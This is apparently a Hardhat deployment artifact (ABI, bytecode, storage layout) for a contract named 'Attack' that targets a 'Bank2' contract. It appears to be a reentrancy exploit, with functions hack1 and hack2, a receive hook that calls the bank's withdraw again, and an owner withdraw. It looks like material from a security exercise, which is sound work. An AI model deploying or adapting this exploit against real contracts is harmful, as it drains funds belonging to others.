{
  "address": "0x7392Ae1f764F22Cb61326d712858D8CD5C9755A1",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "bank_",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract Bank2",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hack1",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hack2",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0x0363e76d0d080800d4595fea9bf1952bbc96c12cc3c586f4261fef8853a33d34",
  "args": [
    "0x866d0461173957Aeb968BF431eaa6A3c9157BE92"
  ],
  "numDeployments": 6,
  "solcInputHash": "5a0348b236218b25f833a11909289117",
  "bytecode": "0x608060405234801561001057600080fd5b506040516105b23803806105b283398101604081905261002f916100ad565b6100383361005d565b600180546001600160a01b0319166001600160a01b03929092169190911790556100dd565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b6000602082840312156100bf57600080fd5b81516001600160a01b03811681146100d657600080fd5b9392505050565b6104c6806100ec6000396000f3fe6080604052600436106100745760003560e01c8063715018a61161004e578063715018a61461012057806376cdb03b146101355780638da5cb5b14610171578063f2fde38b1461018f57600080fd5b8063033e7920146100fb578063203522df146101035780633ccfd60b1461010b57600080fd5b366100f6576001546001600160a01b031631156100f457600160009054906101000a90046001600160a01b03166001600160a01b0316635d69afe86040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100db57600080fd5b505af11580156100ef573d6000803e3d6000fd5b505050505b005b600080fd5b6100f46101af565b6100f4610220565b34801561011757600080fd5b506100f46102e5565b34801561012c57600080fd5b506100f4610327565b34801561014157600080fd5b50600154610155906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b34801561017d57600080fd5b506000546001600160a01b0316610155565b34801561019b57600080fd5b506100f46101aa366004610460565b61033b565b6101b76103b6565b6001546040516000916001600160a01b0316906298968090349084818181858888f193505050503d806000811461020a576040519150601f19603f3d011682016040523d82523d6000602084013e61020f565b606091505b505090508061021d57600080fd5b50565b6102286103b6565b600154604051631bb7ef9560e11b81523060048201526001600160a01b039091169063376fdf2a9034906024016000604051808303818588803b15801561026e57600080fd5b505af1158015610282573d6000803e3d6000fd5b505060015460408051630bad35fd60e31b815290516001600160a01b039092169450635d69afe89350600480820193506000929182900301818387803b1580156102cb57600080fd5b505af11580156102df573d6000803e3d6000fd5b50505050565b6102ed6103b6565b600080546040516001600160a01b03909116914780156108fc02929091818181858888f1935050505015801561021d573d6000803e3d6000fd5b61032f6103b6565b6103396000610410565b565b6103436103b6565b6001600160a01b0381166103ad5760405162461bcd60e51b815260206004820152602660248201527f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160448201526564647265737360d01b60648201526084015b60405180910390fd5b61021d81610410565b6000546001600160a01b031633146103395760405162461bcd60e51b815260206004820181905260248201527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657260448201526064016103a4565b600080546001600160a01b038381166001600160a01b0319831681178455604051919092169283917f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e09190a35050565b60006020828403121561047257600080fd5b81356001600160a01b038116811461048957600080fd5b939250505056fea2646970667358221220d99a7213746db9d9d9c375905e4b6dd4a9e54c58540c7eb0837e183b1b90625764736f6c634300080a0033",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 7,
        "contract": "contracts/Attack.sol:Attack",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 144,
        "contract": "contracts/Attack.sol:Attack",
        "label": "bank",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(Bank2)448"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(Bank2)448": {
        "encoding": "inplace",
        "label": "contract Bank2",
        "numberOfBytes": "20"
      }
    }
  }
}